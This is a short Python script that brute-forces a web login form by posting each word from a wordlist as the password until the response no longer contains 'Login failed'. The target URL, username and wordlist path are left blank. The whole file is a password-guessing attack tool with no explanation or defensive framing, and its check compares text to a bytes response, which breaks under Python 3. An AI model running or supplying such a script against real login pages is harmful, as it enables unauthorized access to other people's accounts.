#!/usr/bin/env python
import requests

target_url = ""
data_dict = {"username": "", "password": "", "Login": "submit"}

with open("", "r") as wlf:
    for line in wlf:
        word = line.strip()
        data_dict["password"] = word
        response = requests.post(target_url, data=data_dict)
        if "Login failed" not in response.content:
            print("[+] Password correct: ", word)
            exit()

print("[-] Passwords in list don't correct")